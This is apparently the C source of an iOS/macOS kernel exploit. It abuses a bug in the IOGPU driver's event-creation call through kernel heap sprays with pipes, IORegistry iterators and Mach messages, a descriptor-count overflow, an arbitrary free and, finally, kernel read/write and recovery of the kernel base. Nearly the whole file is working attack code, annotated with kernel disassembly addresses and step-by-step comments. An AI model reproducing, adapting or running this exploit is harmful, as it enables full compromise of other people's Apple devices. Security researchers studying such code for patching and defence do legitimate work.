#include <stdio.h>
#include <sys/syscall.h>
#include <IOSurface/IOSurfaceRef.h>
#include <pthread.h>
#include "iokit.h"
#include "ENABLE_HELPER.h"
#include "piper.h"
#include "IOSurfaceRoot.h"
#include "port_utils.h"
#include "IOGPU.h"
#include "kernel_rw.h"
#include "kernel_base.h"
#include "spray.h"

#if ENABLE_HELPER
#include "helper/proc.h"
#include "helper/tfp0_find_port.h"
#include "helper/tfp0_krw.h"
#include "helper/offsets.h"
#include "helper/find_IOSurface.h"
#include "helper/kcall8.h"
#include "helper/kexecute.h"
#include "helper/find_pipe.h"

extern uint64_t gKernelSlide, gKernelBase;
extern task_t tfp0;
#endif

mach_port_t IORegistry_create_iterator(void) {
	kern_return_t kr;
	io_iterator_t ite;
	kr = IORegistryCreateIterator(kIOMasterPortDefault, kIOServicePlane, 0, &ite);
	if (kr) {
        *(int *)1 = 0;
    }
	return ite;
}

mach_port_t *it = NULL;
mach_port_t notif_port = MACH_PORT_NULL;
mach_port_t *kheap_default_ports = NULL;
mach_port_t *kheap_data_ports = NULL;
uint8_t *IOSurfaceClient_array_buf = NULL;
int kheap_data_idx = -1;
int extra_frees_for_device = -1;
io_connect_t iogpu_connect = MACH_PORT_NULL;

#define PORTS_COUNT 0x1800
#define KMSG_SIZE 0x3F80 // the low 0x80 byte of this size will be copied to corrupt the message bits (setting 0x80000000, MACH_MSGH_BITS_COMPLEX)

int exploitation_get_krw_with_arb_free(mach_port_t arb_free_holder, uint64_t *kernel_base)
{
    uint8_t msg_buf[0x100];
    int fildes[2];
    pipe(fildes);
    int read_pipe = fildes[0];
    int write_pipe = fildes[1];
    
    // alloc this one before array of IOSurfaceClients becomes 0x4000
    io_connect_t iosurface_connect_krw = IOSurfaceRoot_init();

    // cause max size of arrays of IOSurfaceClients to become 0x4000
    uint32_t last_id = IOSurfaceRoot_cause_array_size_to_be_0x4000();
    
    // trigger arbitrary free in kheap default
    port_destroy(arb_free_holder);
    
    // do refill in kheap default
    IOSurfaceRoot_lookup_surface(iosurface_connect_krw, last_id);
    // NULL out array
    IOSurfaceRoot_release_all(iosurface_connect_krw);

    // find allocation at KHEAP_DEFAULT_MAPPABLE_LOC
    int kheap_default_idx = -1;
    for (uint32_t i = 0;
         (i < PORTS_COUNT) && port_has_msg(notif_port);
         i++)
    {
        port_receive_msg(notif_port, msg_buf, sizeof(msg_buf));
       
        port_destroy(kheap_default_ports[i]);

        kheap_default_idx = i;
    }
    
    // Note: don't add time sensitive code here, allocation at KHEAP_DEFAULT_MAPPABLE_LOC
    // has been free'd and will be refilled below
    
    // printf("Allocation at KHEAP_DEFAULT_MAPPABLE_LOC has been free'd\n");
    
    if (kheap_default_idx >= PORTS_COUNT)
    {
        printf("kheap_default_idx >= PORTS_COUNT\n");
        exit(1);
    }
    
    // extra frees
    for (int i = 0; i < extra_frees_for_device; ++i)
    {
        port_destroy(kheap_default_ports[(kheap_default_idx+1)+i]);
    }
    
    // do refill
    iogpu_connect = IOGPU_init();
    // add entry
    IOGPU_create_command_queue(iogpu_connect, KHEAP_DATA_MAPPABLE_LOC + 0x4000 + 0x10);
    
    printf("kheap_default_idx: %08X\n", kheap_default_idx);
    
    // refill in kheap data
    port_destroy(kheap_data_ports[kheap_data_idx+1]);
    write(write_pipe, IOSurfaceClient_array_buf, KERNEL_RW_SIZE_FAKE_ARRAY-1);

    kernel_rw_init(iosurface_connect_krw, 1, read_pipe, write_pipe);
    
    kwrite32(KHEAP_DEFAULT_MAPPABLE_LOC, 0xFEED);
    uint32_t result = kread32(KHEAP_DEFAULT_MAPPABLE_LOC);
    printf("Test kwrite32 and kread32: %08X (should be 0000FEED)\n", result);
    if (result != 0xFEED)
    {
        printf("Failed! Reboot to try again (remember to only run once per boot)\n");
        exit(1);
    }
    
    printf("Get kernel base...\n");
    
    *kernel_base = kernel_base_from_holder(kheap_data_ports[kheap_data_idx+2], KHEAP_DATA_MAPPABLE_LOC + 0x8000);
    printf("Got kernel base: %p\n", (void *)*kernel_base);
    
    return 0;
}

typedef struct {
    uint64_t iter_count;
    io_connect_t uc;
} thread_args_t;

void *trigger_vuln(void *arg) {
    thread_args_t *args = (thread_args_t *)arg;
    uint64_t iter = args->iter_count;
    io_connect_t uc = args->uc;

    for(uint64_t i = 0; i < iter; i++) {
        uint64_t remaining = iter - i;
        if (remaining % 1000000 == 0) {
            printf("[Thread 1 Remaining]: %llu\n", remaining);
        }

        IOGPU_create_mtllateeventevent(uc);
    }
    
    return NULL;
}

void *trigger_vuln2(void *arg) {
    thread_args_t *args = (thread_args_t *)arg;
    uint64_t iter = args->iter_count;
    io_connect_t uc = args->uc;

    for(uint64_t i = 0; i < iter; i++) {
        uint64_t remaining = iter - i;
        if (remaining % 1000000 == 0) {
            printf("[Thread 2 Remaining]: %llu\n", remaining);
        }

        IOGPU_create_mtllateeventevent(uc);
    }
    
    return NULL;
}

void exploitation_cleanup(void)
{
    uint64_t command_queue_loc = kread64(KHEAP_DEFAULT_MAPPABLE_LOC + 8);
    uint64_t parent_loc = kread64(command_queue_loc + 0x488);
    uint64_t namespace_loc = kread64(parent_loc + 0x88);
    
    // bump refs
    kwrite32(command_queue_loc + 0x8, 10);
    kwrite32(namespace_loc + 0x8, 10);
    
    IOServiceClose(iogpu_connect);
}

int exploit(void) {
    // different by device, retrieve it first and fail if unsuccessful
    extra_frees_for_device = IOGPU_get_command_queue_extra_refills_needed();
    if (extra_frees_for_device == -1)
    {
        printf("Exiting early, provide correct number 1-5 in the code for this device to proceed\n");
        return 1;
    }

	kheap_data_ports = malloc(PORTS_COUNT * sizeof(mach_port_t));
    kheap_default_ports = malloc(PORTS_COUNT * sizeof(mach_port_t));
    mach_port_t *contained_ports = malloc(PORTS_COUNT * sizeof(mach_port_t));
    mach_port_t *ool_ports = malloc(0x4000);
    uint8_t *kheap_data_spray_buf = malloc(0x4000);
    memset(kheap_data_ports, 0, PORTS_COUNT * sizeof(mach_port_t));
    memset(kheap_default_ports, 0, PORTS_COUNT * sizeof(mach_port_t));
    memset(contained_ports, 0, PORTS_COUNT * sizeof(mach_port_t));
    memset(ool_ports, 0, 0x4000);
    memset(kheap_data_spray_buf, 0, 0x4000);
    increase_file_limit();

    // iterator stuffs
    int it_count = 0x1c000;   //TODO.. about 8.192 MB spray
	it = malloc(it_count * sizeof(mach_port_t));

    // spray stuffs
    size_t pipe_count = 980;
    size_t pipe_buffer_size = 0x4000;
    uint8_t *pipe_buffer = (uint8_t *)malloc(pipe_buffer_size);
    void* recv_buf = malloc(pipe_buffer_size);

    // pre-init kernel rw
    IOSurfaceClient_array_buf = malloc(0x4000);
    kernel_rw_preinit(KHEAP_DATA_MAPPABLE_LOC + 0x4000 + 0x10, IOSurfaceClient_array_buf, 0x4000);



    // STEP 2: spray pipe
    int *pipefds = create_pipes(&pipe_count);
    
    uint64_t x8 = (KHEAP_DATA_MAPPABLE_LOC+0x50);  // x8 will be Pointed here.  //com.apple.AGXG9P:__text:FFFFFFF005DC508C     LDR X0, [X8,#0x10]
    memset_pattern8(pipe_buffer, &x8, pipe_buffer_size);

    pipe_spray(pipefds, pipe_count, pipe_buffer, pipe_buffer_size, NULL);
    // STEP 2 end




    
#if 1
    // STEP 1: spray IORegistry_create_iterator
    //VTAB. FFFFFFF00714D988

    for(int i = 0; i < it_count; i++) {
		it[i] = IORegistry_create_iterator();
	}

#if ALWAYS_SURVIVE
    CPP_OBJ_PTR = tfp0_kread64(port_to_kobject(it[it_count-1000]) + 0x10);
    printf("cpp_obj_ptr = 0x%llx\n", CPP_OBJ_PTR);
#endif
    
    uint32_t cpp_obj_ptr_32 = CPP_OBJ_PTR & 0xFFFFFFFF;
    uint64_t make_overflow_count = 0xFFFFFFFF - cpp_obj_ptr_32 + 1;
    printf("make_overflow_count = 0x%llx\n", make_overflow_count);
    // getchar();
#endif
// STEP 1 end


    // STEP 3: spray kmsg (default.kalloc.0x4000 / data.kalloc.0x4000)
    // fake descriptor for free primitive
    memset(kheap_data_spray_buf, 0x42, 0x4000);
    memset(kheap_data_spray_buf, 0, sizeof(mach_msg_header_t));
    *(uint32_t *)(kheap_data_spray_buf + sizeof(mach_msg_header_t)) = 0;    //will be increased after trigger vuln
    *(uint64_t *)(kheap_data_spray_buf + sizeof(mach_msg_header_t) + sizeof(uint32_t)) = KHEAP_DEFAULT_MAPPABLE_LOC; // free primitive target
    
    // *(uint64_t *)(kheap_data_spray_buf + sizeof(mach_msg_header_t) + sizeof(uint32_t) + sizeof(uint64_t)) = 0x000007F802110000; // disposition, size, etc
    // deallocate = 0x00000000(false), copy = 0x00000000(MACH_MSG_PHYSICAL_COPY), disposition = 0x00000011(MACH_MSG_TYPE_MOVE_SEND), type = 0x00000002(MACH_MSG_OOL_PORTS_DESCRIPTOR)
    *(uint32_t *)(kheap_data_spray_buf + sizeof(mach_msg_header_t) + sizeof(uint32_t) + sizeof(uint64_t)) = 0x02110000;

    //ikm_header+0x20's value will be increased, +1
    // C++ vftable ptr to SURVIVE!
    *(uint64_t *)(kheap_data_spray_buf + sizeof(mach_msg_header_t) + sizeof(uint32_t) + sizeof(uint32_t) + sizeof(uint64_t)) = CPP_OBJ_PTR; //written at ikm_header+0x30
    // should be 0 to branch loc_FFFFFFF005DC5118; com.apple.AGXG9P:__text:FFFFFFF005DC50D8 08 02 00 B4                             CBZ             X8, loc_FFFFFFF005DC5118
    *(uint64_t *)(kheap_data_spray_buf + sizeof(mach_msg_header_t) + sizeof(uint32_t) + sizeof(uint32_t) + sizeof(uint64_t)*2) = 0x0;   //written at ikm_header+0x38

    //Needed to make ikm_header+0x30's value overflowed to match with 0x7f8;
    // C++ vftable ptr to SURVIVE!
    *(uint64_t *)(kheap_data_spray_buf + sizeof(mach_msg_header_t) + sizeof(uint32_t) + sizeof(uint32_t) + sizeof(uint64_t)*3) = CPP_OBJ_PTR; //written at ikm_header+0x40
    // should be 0 to branch loc_FFFFFFF005DC5118; com.apple.AGXG9P:__text:FFFFFFF005DC50D8 08 02 00 B4                             CBZ             X8, loc_FFFFFFF005DC5118
    *(uint64_t *)(kheap_data_spray_buf + sizeof(mach_msg_header_t) + sizeof(uint32_t) + sizeof(uint32_t) + sizeof(uint64_t)*4) = 0x0;   //written at ikm_header+0x48

    // determine if corrupted kmsg
    *(uint64_t *)(kheap_data_spray_buf + sizeof(mach_msg_header_t) + sizeof(uint32_t) + sizeof(uint32_t) + sizeof(uint64_t)*5) = 0x1337133713371337; //written at ikm_header+0x50
    // C++ vftable ptr to SURVIVE!
    *(uint64_t *)(kheap_data_spray_buf + sizeof(mach_msg_header_t) + sizeof(uint32_t) + sizeof(uint32_t) + sizeof(uint64_t)*7) = CPP_OBJ_PTR; //written at ikm_header+0x60
    // should be 0 to branch loc_FFFFFFF005DC5118; com.apple.AGXG9P:__text:FFFFFFF005DC50D8 08 02 00 B4                             CBZ             X8, loc_FFFFFFF005DC5118
    *(uint64_t *)(kheap_data_spray_buf + sizeof(mach_msg_header_t) + sizeof(uint32_t) + sizeof(uint32_t) + sizeof(uint64_t)*8) = 0x0;   //written at ikm_header+0x68

    for (int i = 0; i < PORTS_COUNT; ++i) {
        // KHEAP_DATA_BUFFERS
        kheap_data_ports[i] = spray_data_kalloc_complex_kmsg_single(kheap_data_spray_buf, KMSG_SIZE);
    }
    for (int i = 0; i < PORTS_COUNT; ++i)
    {
        // KHEAP_DEFAULT
        *ool_ports = port_new();
        contained_ports[i] = *ool_ports;
        mach_port_t *pp = spray_default_kalloc_ool_ports(0x4000, 1, ool_ports);
        kheap_default_ports[i] = pp[0];
        free(pp);
    }   

    notif_port = port_new();
    for (int i = 0; i < PORTS_COUNT; ++i)
    {
        mach_port_t prev;
        mach_port_request_notification(mach_task_self(), contained_ports[i], MACH_NOTIFY_NO_SENDERS, 0, notif_port, MACH_MSG_TYPE_MAKE_SEND_ONCE, &prev);
        mach_port_deallocate(mach_task_self(), contained_ports[i]);
    }
    //STEP 3 end






    // STEP 4: Trigger vuln; will increase value in ikm_header+0x50 and determine which kmsg has been corrupted
    //아이디어: port_receive_msg로 어떤포트를 컨트롤하는지 알아낸다음, 해당 포트를 유지한채 다시 매시지를 전송시켜 제대로 컨트롤하기 
    io_connect_t uc = IOGPU_init();
	for (int i = 0; i < 2048; ++i)
		IOGPU_create_mtllateeventevent(uc);
	IOGPU_create_mtllateeventevent(uc); //real trigger

    uint8_t msg_buf[0x4000];
    mach_port_t arb_free_holder = MACH_PORT_NULL;
    for (int i = 0; i < PORTS_COUNT; ++i) {
        memset(msg_buf, 0, KMSG_SIZE);
        port_receive_msg(kheap_data_ports[i], msg_buf, sizeof(msg_buf));

        if(*(uint64_t*)(msg_buf + 0x48) != 0x1337133713371337) {
            printf("kheap_data_idx: %08X\n", i);
            kheap_data_idx = i;
            arb_free_holder = kheap_data_ports[kheap_data_idx];

            // for(int j = 0; j <= kheap_data_idx; j++) {
                send_data_kalloc_complex_kmsg_single(arb_free_holder, kheap_data_spray_buf, KMSG_SIZE); //resend
            // }
            break;
        }
    }
    printf("Survived, Determined which kmsg has been corrupted!\n");
    // getchar();


    // STEP 5: Trigger vuln; will increase mach_msg_body_t's msgh_descriptor_count count
    x8 = (KHEAP_DATA_MAPPABLE_LOC+0x20);  // x8 will be Pointed here.  //com.apple.AGXG9P:__text:FFFFFFF005DC508C     LDR X0, [X8,#0x10]
    memset_pattern8(pipe_buffer, &x8, pipe_buffer_size);
    for(int i = 0; i < pipe_count; i++) {
        read(pipefds[2 * i], recv_buf, pipe_buffer_size);
        write(pipefds[2 * i + 1], pipe_buffer, pipe_buffer_size-1);
    }
	IOGPU_create_mtllateeventevent(uc);
    printf("Increased mach_msg_body_t's msgh_descriptor_count to 1\n");



    // STEP 6: Overflowing to make mach_msg_ool_ports_descriptor_t's count = 0x7F8;
    printf("Overflowing mach_msg_ool_ports_descriptor_t's count to make 0x7f8...\n");
    x8 = (KHEAP_DATA_MAPPABLE_LOC+0x30);  // x8 will be Pointed here.  //com.apple.AGXG9P:__text:FFFFFFF005DC508C     LDR X0, [X8,#0x10]
    memset_pattern8(pipe_buffer, &x8, pipe_buffer_size);
    for(int i = 0; i < pipe_count; i++) {
        read(pipefds[2 * i], recv_buf, pipe_buffer_size);
        write(pipefds[2 * i + 1], pipe_buffer, pipe_buffer_size-1);
    }
#if ENABLE_PROFILLING
    // PIPE
    for(int i = 0; i < pipe_count; i++) {
        int rfd = pipefds[2 * i];
        uint64_t pipe_kaddr = obtain_pipe_kaddr(rfd);
        printf("pipe_kaddr = 0x%llx\n", pipe_kaddr);
    }
    

    //KHEAP_DEFAULT
    for (int i = 0; i < PORTS_COUNT; ++i) 
    {
        printf("kheap_default_ports's default.kalloc.0x4000 kptr = 0x%llx\n", find_oolports_from_port(kheap_default_ports[i]));
    }
    //KHEAP_DATA_BUFFERS
    for (int i = 0; i < PORTS_COUNT; ++i) 
    {
        printf("kheap_data_ports's ikm_header = 0x%llx\n", find_kmsgdata_from_port(kheap_data_ports[i]));
    }

    //cpp_obj_ptr to survive
    for(int i = 0; i < it_count; i++) {
		uint64_t cpp_obj_ptr = tfp0_kread64(port_to_kobject(it[i]) + 0x10);
        printf("cpp_obj_ptr = 0x%llx\n", cpp_obj_ptr);
	}
    while(1) {};
    uint64_t make_overflow_count = 0x11111111;
#endif
    uint64_t iter = make_overflow_count + 0x7F8;



#if 1
    pthread_t pt1;
    pthread_t pt2;
    pthread_attr_t pattr;
    pthread_attr_init(&pattr);
    pthread_attr_set_qos_class_np(&pattr, QOS_CLASS_USER_INITIATED, 0);

    thread_args_t *args1 = (thread_args_t *)malloc(sizeof(thread_args_t));
    thread_args_t *args2 = (thread_args_t *)malloc(sizeof(thread_args_t));
    args1->iter_count = (iter / 2);
    args1->uc = uc;
    args2->iter_count = (iter - (iter / 2));
    args2->uc = uc;

    pthread_create(&pt1, &pattr, (void *(*)(void *))trigger_vuln, (void *)args1);
    pthread_create(&pt2, &pattr, (void *(*)(void *))trigger_vuln2, (void *)args2);
    pthread_join(pt1, NULL);
    pthread_join(pt2, NULL);
    free(args1);
    free(args2);
    pthread_attr_destroy(&pattr);
#endif

    // for(uint64_t i = 0; i < iter; i++) {
    //     uint64_t remaining = iter - i;

    //     if (remaining % 1000000 == 0) {
    //         printf("Remaining iterations: %llu\n", remaining);
    //     }

	//     IOGPU_create_mtllateeventevent(uc);
    // }

    printf("Made mach_msg_ool_ports_descriptor_t's count to 0x7F8\n");


    // STEP 7: generic exploitation using arbitrary free
    uint64_t kernel_base = 0;
    exploitation_get_krw_with_arb_free(arb_free_holder, &kernel_base);



    // STEP 8: test kernel r/w, read kernel base
    uint32_t mh_magic = kread32(kernel_base);
    if (mh_magic != 0xFEEDFACF)
    {
        printf("mh_magic != 0xFEEDFACF: %08X\n", mh_magic);
        return 1;
    }
    printf("kread32(kernel_base) success: %08X\n", mh_magic);
    

    
    // STEP 9: cleanup
    // generic exploitation cleanup (kernel r/w still active)
    exploitation_cleanup();

	return 0;
}

int main(int argc, char *argv[], char *envp[]) {
#if ENABLE_HELPER
    tfp0_init();
    tfp0_get_kernel_base();
    offsets_init();
    printf("tfp0 = 0x%x\n", tfp0);
    printf("gKernelBase = 0x%llx, gKernelSlide = 0x%llx\n", gKernelBase, gKernelSlide);
    init_kexecute();
#endif

	exploit();

TEST:

#if ENABLE_HELPER
    term_kexecute();

    tfp0_deinit();
#endif

	return 0;
}
